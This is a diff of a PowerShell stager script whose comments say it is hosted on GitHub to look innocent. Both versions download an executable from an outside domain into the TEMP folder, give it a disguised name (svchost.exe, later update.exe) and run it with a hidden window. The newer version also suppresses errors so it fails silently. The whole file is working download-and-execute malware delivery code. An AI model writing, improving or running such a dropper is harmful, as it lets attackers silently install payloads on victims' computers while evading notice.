@@ -1,10 +1,21 @@
-# This file is hosted at: https://raw.githubusercontent.com/YourUser/YourRepo/main/stager.ps1
-# It looks innocent and is hosted on a trusted domain.
+# This is the stager script hosted on GitHub.
+# Its job is to download and execute the real payload.
 
-# The real, malicious URL is now hidden here.
- $realUrl = "https://avrasyaturizm.net/temp/calc.exe"
- $dest = "$env:TEMP\svchost.exe"
+# --- IMPORTANT ---
+# Replace this with the URL to your final .exe payload
+ $PayloadUrl = "https://avrasyaturizm.net/temp/calc.exe"
 
-# Use a trusted method to download the final payload.
-Invoke-WebRequest -Uri $realUrl -OutFile $dest
-Start-Process -FilePath $dest -WindowStyle Hidden
+# Define a destination path in the temp folder
+ $Destination = "$env:TEMP\update.exe"
+
+# Download the payload using a common command
+try {
+    Invoke-WebRequest -Uri $PayloadUrl -OutFile $Destination -ErrorAction Stop
+    
+    # Execute the downloaded file silently
+    Start-Process -FilePath $Destination -WindowStyle Hidden
+    
+} catch {
+    # Optional: Handle errors if the download fails
+    # For now, it will just fail silently if the URL is bad
+}
